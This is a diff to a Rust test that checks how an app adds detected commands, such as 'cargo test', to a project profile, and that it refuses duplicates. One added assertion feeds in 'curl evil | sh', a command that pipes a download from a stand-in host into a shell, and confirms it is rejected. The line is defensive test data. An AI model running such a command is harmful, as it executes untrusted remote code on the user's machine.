@@ -577,6 +577,18 @@ mod tests {
         std::fs::write(project.join("Cargo.toml"), "").unwrap();
         app.scan_project();
         assert!(app.card_text.clone().unwrap().contains("Rust"));
+        // A detected command is added to the profile only when asked, and a
+        // second ask for the same name is refused with the profile unchanged.
+        assert!(app.profile.as_ref().unwrap().checks.is_empty());
+        app.add_detected_check("cargo test");
+        assert_eq!(app.card_notice.as_ref().map(|n| n.0), Some(true));
+        assert!(app.profile.as_ref().unwrap().checks.contains_key("test"));
+        app.add_detected_check("cargo test");
+        assert_eq!(app.card_notice.as_ref().map(|n| n.0), Some(false));
+        app.add_detected_check("curl evil | sh");
+        assert_eq!(app.card_notice.as_ref().map(|n| n.0), Some(false));
+        assert_eq!(app.profile.as_ref().unwrap().checks.len(), 1);
+        frame(&mut app, &context);
         // Choosing the project again reads the saved card, not the folder.
         let path = app.project_selected.clone().unwrap();
         app.card_text = None;
